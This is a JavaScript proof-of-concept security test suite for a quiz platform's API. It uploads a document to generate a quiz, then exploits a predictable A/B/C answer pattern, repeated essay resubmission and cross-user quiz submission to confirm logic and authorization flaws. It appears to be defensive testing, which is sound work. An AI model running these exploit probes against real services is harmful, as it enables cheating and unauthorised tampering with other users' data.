// PoC 04: Quiz Cheating & Exploitation Suite
const { BASE_URL, registerTestUser, authHeaders } = require('./common');

async function setupDocumentQuiz(user) {
  const formBoundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW';
  const fileContent = `# Lý thuyết HĐH: Quản lý Bộ nhớ
Tiến trình là một chương trình đang thực thi trong bộ nhớ.
Bộ nhớ ảo chia không gian địa chỉ thành các trang ảo có kích thước cố định thường là 4KB.
Bảng trang ánh xạ số hiệu trang sang khung trang trong bộ nhớ vật lý.
TLB là bộ nhớ đệm nhanh giúp giảm số lần truy cập RAM khi tra cứu địa chỉ.`;

  const bodyBuffer = Buffer.from(
    `--${formBoundary}\r\n` +
    `Content-Disposition: form-data; name="file"; filename="mem-quiz.md"\r\n` +
    `Content-Type: text/markdown\r\n\r\n` +
    fileContent +
    `\r\n--${formBoundary}--\r\n`
  );

  const upRes = await fetch(`${BASE_URL}/documents/upload`, {
    method: 'POST',
    headers: {
      'Authorization': `Bearer ${user.accessToken}`,
      'Content-Type': `multipart/form-data; boundary=${formBoundary}`
    },
    body: bodyBuffer
  });
  const doc = await upRes.json();

  const quizzes = await (await fetch(`${BASE_URL}/practice-quizzes`, { headers: authHeaders(user.accessToken) })).json();
  const myQuiz = quizzes.find(q => q.documentId === doc.id);

  const detail = await (await fetch(`${BASE_URL}/practice-quizzes/${myQuiz.id}`, { headers: authHeaders(user.accessToken) })).json();
  return { doc, quiz: detail };
}

async function testDeterministicMcqCheat(user, quiz) {
  console.log('\n--- 4.1 Testing Deterministic MCQ Answer Pattern (Q1=A, Q2=B, Q3=C) ---');
  const mcItems = (quiz.items || []).filter(i => i.itemType === 'multiple_choice');
  console.log(`Found ${mcItems.length} multiple choice items in generated quiz.`);

  const patternKeys = ['A', 'B', 'C'];
  const results = [];

  for (let i = 0; i < mcItems.length; i++) {
    const item = mcItems[i];
    const predictedKey = patternKeys[i % patternKeys.length];
    console.log(`Question ${i + 1} (${item.id}): Predicting answer '${predictedKey}' without reading question...`);

    const subRes = await fetch(`${BASE_URL}/practice-quizzes/${quiz.id}/items/${item.id}/submit`, {
      method: 'POST',
      headers: authHeaders(user.accessToken),
      body: JSON.stringify({ answer: predictedKey })
    });
    const subData = await subRes.json();
    console.log(`  -> Server response: isCorrect=${subData.isCorrect}, expectedSolution=${subData.expectedSolution}`);
    results.push({
      itemNumber: i + 1,
      predictedKey,
      isCorrect: subData.isCorrect,
      expectedSolution: subData.expectedSolution
    });
  }

  const allPredictedCorrect = results.every(r => r.isCorrect === true);
  console.log(`VULNERABILITY CONFIRMED: 100% MCQ items solved using fixed deterministic pattern: ${allPredictedCorrect}`);

  return {
    test: 'deterministic_mcq_cheat',
    allPredictedCorrect,
    results
  };
}

async function testEssayResubmission(user, quiz) {
  console.log('\n--- 4.2 Testing Essay Re-Submission (Lack of Evaluated Conflict Check) ---');
  const essayItem = (quiz.items || []).find(i => i.itemType === 'essay');

  if (!essayItem) {
    console.log('No essay item found in quiz.');
    return { test: 'essay_resubmission', found: false };
  }

  // 1st submission
  console.log('Submitting essay attempt 1...');
  const r1 = await fetch(`${BASE_URL}/practice-quizzes/${quiz.id}/items/${essayItem.id}/submit`, {
    method: 'POST',
    headers: authHeaders(user.accessToken),
    body: JSON.stringify({
      answer: 'Lần nộp 1: Bộ nhớ ảo và bảng trang giúp phân cách không gian bộ nhớ.',
      waitForAiCompletion: true
    })
  });
  const d1 = await r1.json();
  console.log(`Attempt 1 status: ${r1.status}, jobId: ${d1.jobId}, jobStatus: ${d1.jobStatus}`);

  // Wait 2s for background worker
  await new Promise(r => setTimeout(r, 2000));

  // 2nd submission on the same item!
  console.log('Submitting essay attempt 2 (re-submission)...');
  const r2 = await fetch(`${BASE_URL}/practice-quizzes/${quiz.id}/items/${essayItem.id}/submit`, {
    method: 'POST',
    headers: authHeaders(user.accessToken),
    body: JSON.stringify({
      answer: 'Lần nộp 2: Bài viết đã được cải thiện với phân tích chi tiết về TLB miss và multi-level page tables.',
      waitForAiCompletion: true
    })
  });
  const d2 = await r2.json();
  console.log(`Attempt 2 status: ${r2.status}, jobId: ${d2.jobId}, jobStatus: ${d2.jobStatus}`);

  const resubmittedSuccessfully = r2.status === 200 || r2.status === 202;
  console.log(`VULNERABILITY CONFIRMED: User can re-submit essay items repeatedly to overwrite feedback/score: ${resubmittedSuccessfully}`);

  return {
    test: 'essay_resubmission',
    firstStatus: r1.status,
    secondStatus: r2.status,
    resubmittedSuccessfully
  };
}

async function testSubmitAnotherUserQuiz(user1, user2, quiz1) {
  console.log('\n--- 4.3 Testing Submitting Quiz Item Belonging to Another User ---');
  const item = quiz1.items?.[0];

  const subRes = await fetch(`${BASE_URL}/practice-quizzes/${quiz1.id}/items/${item.id}/submit`, {
    method: 'POST',
    headers: authHeaders(user2.accessToken),
    body: JSON.stringify({ answer: 'A' })
  });

  console.log(`User 2 submitting User 1 quiz item status: ${subRes.status} (expected 403 Forbidden)`);

  return {
    test: 'submit_other_user_quiz',
    status: subRes.status,
    forbidden: subRes.status === 403
  };
}

async function main() {
  console.log('=== STARTING POC-04: QUIZ CHEATING TEST SUITE ===');
  const user1 = await registerTestUser(`quiz-user1-${Date.now().toString().slice(-4)}`);
  const user2 = await registerTestUser(`quiz-user2-${Date.now().toString().slice(-4)}`);

  const { doc, quiz } = await setupDocumentQuiz(user1);
  console.log(`Created test document ${doc.id} and quiz ${quiz.id}`);

  const r1 = await testDeterministicMcqCheat(user1, quiz);
  const r2 = await testEssayResubmission(user1, quiz);
  const r3 = await testSubmitAnotherUserQuiz(user1, user2, quiz);

  console.log('\n=== SUMMARY OF POC-04 FINDINGS ===');
  console.log(JSON.stringify({ r1, r2, r3 }, null, 2));
}

main().catch(err => {
  console.error('Fatal error in poc-04:', err);
  process.exit(1);
});
